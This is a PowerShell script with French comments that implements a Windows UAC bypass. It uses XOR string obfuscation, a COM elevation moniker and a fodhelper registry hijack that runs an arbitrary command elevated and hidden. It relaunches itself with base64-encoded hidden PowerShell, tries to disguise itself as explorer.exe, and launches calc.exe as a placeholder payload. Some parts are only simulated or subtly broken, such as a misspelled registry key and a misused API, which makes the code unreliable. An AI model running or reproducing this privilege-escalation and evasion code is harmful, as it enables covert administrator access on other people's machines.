# Désactiver les logs
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

# === 1. skCrypt - Chiffrement de chaînes (simulé) ===
function Invoke-XORCipher {
    param([string]$Data, [char]$K1 = 'A', [char]$K2 = 'B')
    $Out = ''
    for ($i = 0; $i -lt $Data.Length; $i++) {
        $Out += [char]($Data[$i] -bxor ([int]$K1 + $i % (1 + [int]$K2)))
    }
    return $Out
}

# Simuler __TIME__ (ex: 15:30:45 → '3' et '5')
$FakeTime = "15:30:45"
$Key1 = [int]$FakeTime[4]  # '3'
$Key2 = [int]$FakeTime[7]  # '5'

function skCrypt {
    param([string]$String)
    return Invoke-XORCipher -Data $String -K1 $Key1 -K2 $Key2
}

# Chaînes chiffrées
$sTaskName = skCrypt "Task Name"
$sAuthorName = skCrypt "Author Name"

# === 2. ICMUACUtil GUID ===
$IID_ICMUACUtil = "{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
$CLSID_ICMUACUtil = "{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"

# === 3. ucmAllocateElevatedObject (via CoGetObject) ===
function ucmAllocateElevatedObject {
    param([string]$CLSID, [string]$IID = $IID_ICMUACUtil)
    try {
        $MonikerName = "Elevation:Administrator!new:$CLSID"
        $Obj = [System.Activator]::GetObject([Type], $MonikerName)
        return $Obj
    }
    catch {
        return $null
    }
}

# === 4. MaskPEB - Simulation (ne peut pas être fait en pure PowerShell) ===
# On va simuler en modifiant le CommandLine affiché (via WMI) ou en lançant un faux nom
function MaskPEB {
    try {
        # Simuler le masquage en changeant le nom affiché
        $FakePath = "$env:SystemRoot\explorer.exe"
        $CommandLine = "`"$FakePath`""

        # Modifier le CommandLine dans WMI (échoue sans droits élevés, mais montre l'intention)
        $Process = Get-WmiObject -Class Win32_Process -Filter "ProcessId=$PID"
        if ($Process) {
            # Impossible d'éditer directement, mais on peut logiquement "simuler"
            $script:MaskedPath = $FakePath
            $script:MaskedCmdLine = $CommandLine
            return $true
        }
    }
    catch { }
    return $false
}

# === 5. UACShellExec - Utilise ICMUACUtil ou fallback vers Start-Process ===
function UACShellExec {
    param([string]$Executable, [string]$Parameters = "", [int]$Show = 0)

    # Tentative via ICMUACUtil
    $CMUACUtil = ucmAllocateElevatedObject -CLSID $CLSID_ICMUACUtil

    if ($CMUACUtil) {
        try {
            # Appel indirect (non disponible en PowerShell → fallback)
            # On utilise Start-Process -Verb RunAs
            $StartInfo = New-Object Diagnostics.ProcessStartInfo
            $StartInfo.FileName = $Executable
            $StartInfo.Arguments = $Parameters
            $StartInfo.WindowStyle = [Diagnostics.ProcessWindowStyle]::Hidden
            $StartInfo.UseShellExecute = $true
            $StartInfo.Verb = "RunAs"
            [Diagnostics.Process]::Start($StartInfo) | Out-Null
            return $true
        }
        catch { return $false }
        finally {
            if ($CMUACUtil -and $CMUACUtil.GetType().GetMethod("Dispose")) {
                $CMUACUtil.Dispose()
            }
        }
    }
    else {
        # Fallback : fodhelper bypass
        $RegPath = "HKCU:\Software\Classes\ms-settings-powershell\Shell\Open\command"
        try {
            New-Item -Path $RegPath -Force | Out-Null
            New-ItemProperty -Path $RegPath -Name "DelegateExecute" -Value "" -PropertyType String -Force | Out-Null
            Set-ItemProperty -Path $RegPath -Name "(Default)" -Value "cmd /c $Executable $Parameters" -Force | Out-Null
            Start-Process "fodhelper.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
            Start-Sleep -Seconds 2
            return $true
        }
        catch { return $false }
        finally {
            Remove-Item "HKCU:\Software\Classes\ms-settings-powershell" -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

# === 6. WinMain - Logique principale ===
function WinMain {
    # Obtenir le chemin du script
    $ScriptPath = if ($MyInvocation.MyCommand.Path) { $MyInvocation.MyCommand.Path } else { $PSCommandPath }

    # Vérifier si déjà élevé
    $IsElevated = $false
    try {
        $Identity = [Security.Principal.WindowsIdentity]::GetCurrent()
        $Principal = New-Object Security.Principal.WindowsPrincipal($Identity)
        $IsElevated = $Principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    } catch { }

    if (-not $IsElevated) {
        # Masquer le processus
        if (-not (MaskPEB)) { return }

        # Relancer via PowerShell avec élévation
        $EncodedCmd = [Convert]::ToBase64String(
            [Text.Encoding]::Unicode.GetBytes("& '$ScriptPath'")
        )
        $null = UACShellExec -Executable "powershell.exe" -Parameters "-nop -w hidden -enc $EncodedCmd" -Show 0
    }
    else {
        # Déjà élevé : masquer et exécuter payload
        if (-not (MaskPEB)) { return }

        # Exemple : calc
        $null = UACShellExec -Executable "calc.exe" -Show 0
    }
}

# === Exécution ===
WinMain
